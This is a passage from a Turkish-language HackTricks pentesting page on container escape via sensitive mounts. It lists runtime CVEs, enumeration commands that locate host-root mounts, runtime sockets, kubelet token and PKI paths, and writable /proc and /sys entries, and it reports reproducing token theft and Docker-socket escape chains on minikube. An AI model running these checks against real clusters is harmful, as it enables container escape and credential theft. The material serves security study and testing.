- Buildah ve Podman build akışlarındaki `CVE-2024-1753`: hazırlanmış bind mount'lar build sırasında `/` dizinini read-write olarak açığa çıkarabiliyordu.
- `containerd` 2.1.0 içindeki `CVE-2025-47290`: image unpack sırasında gerçekleşen bir TOCTOU, özel olarak hazırlanmış bir image'ın pull sırasında host filesystem'ını değiştirmesine olanak tanıyabiliyordu.

Bu CVE'ler burada önemlidir; çünkü mount işlemlerinin yalnızca operatör yapılandırmasıyla ilgili olmadığını gösterir. Runtime'ın kendisi de mount kaynaklı escape koşulları oluşturabilir.

## Kontroller

En yüksek değerli mount açıklarını hızlıca bulmak için şu komutları kullanın:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Burada ilginç olanlar:

- Host root, `/proc`, `/sys`, `/var` ve runtime soketleri yüksek öncelikli bulgulardır.
- Yazılabilir proc/sys girdileri, mount'un genellikle güvenli bir container görünümü yerine host genelindeki kernel denetimlerini açığa çıkardığı anlamına gelir.
- Mount edilmiş `/var` yolları yalnızca dosya sistemi incelemesini değil, kimlik bilgileri ve komşu workload'ların incelenmesini de gerektirir.
- Kubelet durum dizinleri ve CNI/plugin yolları, runtime soketleriyle aynı önceliği hak eder; çünkü genellikle doğrudan node'un pod oluşturma ve kimlik bilgisi dağıtma yolunda bulunurlar.

## Yerel Doğrulama Durumu

Bu sayfadaki pratik zincirler yerel bir Linux minikube node'u üzerinde kontrol edildi. Doğrulamada şunlar yeniden üretildi:

- Geçici, yazılabilir bir hostPath üzerinden okuma ve yazma erişimi
- `/var/lib/kubelet/pods` üzerinden projelendirilmiş ServiceAccount token'larının ve mount edilmiş Secret'ların keşfi
- Mount edilmiş kubelet durumundan elde edilen etkin bir token ile başarılı Kubernetes API kimlik doğrulaması
- Mount edilmiş `/var` üzerinden komşu bir Docker `overlay2` dosya sisteminin salt okunur keşfi
- Mount edilmiş bir `docker.sock` üzerinden salt okunur host bind kullanan kardeş bir container'ın Docker API ile oluşturulması
- Geçici, host tarafından tüketilen bir hook üzerinden gecikmeli host yürütmesi
- Orijinal plugin'in argümanlarını, standart girdisini ve yürütmesini koruyan bir CNI-wrapper simülasyonu

Aynı node'da `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` ve `config.gz` da açığa çıkmıştı; ancak `uevent_helper`, EFI değişkenleri, thermal girdileri veya `sched_debug` açığa çıkmamıştı. Yıkıcı kernel tetikleyicileri çalıştırılmadı. Bu, host-root, `/var`, kubelet durumu, soket ve host-consumer zincirlerinin yeniden üretilebilir olduğunu; procfs/sysfs helper tekniklerinin ise kullanılan kernel'e, mount moduna, payload yoluna ve tetikleyiciye bağlı olduğunu doğrular.

## References

- [1] [Kubelet Tarafından Kullanılan Yerel Dosyalar ve Yollar](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container, `hostPath` mount üzerinden host'a erişebilir](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
